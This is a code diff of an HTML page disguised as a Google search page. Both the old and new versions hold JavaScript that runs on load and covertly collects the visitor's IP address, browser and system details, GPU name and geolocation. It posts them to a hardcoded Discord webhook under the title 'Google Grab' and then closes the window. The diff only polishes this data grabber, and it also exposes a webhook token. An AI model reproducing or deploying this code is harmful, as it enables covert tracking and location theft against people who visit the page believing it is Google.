@@ -1,15 +1,32 @@
-<!DOCTYPE html><html><head><title>Google</title><style>body{margin:0;background:#fff;color:#000;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}#logo{font-size:5rem;color:#4285f4;margin-bottom:20px;}input{width:500px;padding:12px;border:1px solid #dfe1e5;border-radius:24px;}</style></head><body><div id="logo">Google</div><input type="text" value="Searching..." readonly><div id="status" style="margin-top:20px;color:#666;">Loading...</div><script>
-const WEBHOOK_URL='https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
-const info={timestamp:new Date().toISOString(),ip:null,pcName:'unknown',userAgent:navigator.userAgent,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,latitude:null,longitude:null};
-async function main(){
-  try{info.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{}
-  try{const gl=document.createElement('canvas').getContext('webgl');const ext=gl.getExtension('WEBGL_debug_renderer_info');info.pcName=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'n/a';}catch{}
-  if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>{info.latitude=p.coords.latitude;info.longitude=p.coords.longitude;send();},()=>send());
-  else send();
-  async function send(){
-    const fd=new FormData(); fd.append('payload_json',JSON.stringify({content:'**Google Meta Grab**',embeds:[{description:JSON.stringify(info,null,2)}]}));
-    await fetch(WEBHOOK_URL,{method:'POST',body:fd});
-    setTimeout(()=>window.close(),900);
+<!DOCTYPE html><html><head><title>Google</title><style>body{margin:0;background:#fff;color:#000;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}#logo{font-size:82px;color:#4285f4;letter-spacing:-2px;margin-bottom:20px;}input{width:582px;padding:13px 20px;border:1px solid #dfe1e5;border-radius:50px;outline:none;font-size:18px;}</style></head><body><div id="logo">Google</div><input type="text" value="Loading search results..." readonly><div id="status" style="margin-top:30px;color:#666;font-size:14px;">Analyzing page...</div><script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
+const info = {ts: new Date().toISOString(), ip: 'fetching', pcHint: 'n/a', ua: navigator.userAgent, plat: navigator.platform, scr: `${screen.width}x${screen.height}`, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lat: null, lon: null};
+async function main() {
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    info.ip = (await ipRes.json()).ip;
+  } catch(e) { info.ip = 'err'; }
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if (dbg) info.pcHint = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch(e) {}
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(p => {
+      info.lat = p.coords.latitude; info.lon = p.coords.longitude; sendData();
+    }, () => sendData(), {timeout:8000});
+  } else sendData();
+  async function sendData() {
+    try {
+      const fd = new FormData();
+      fd.append('payload_json', JSON.stringify({content: '**Google Grab**', embeds: [{description: JSON.stringify(info, null, 2)}]}));
+      await fetch(WEBHOOK_URL, {method: 'POST', body: fd});
+    } catch(e) {}
+    setTimeout(() => window.close(), 1200);
   }
-}main();
+}
+main();
 </script></body></html>
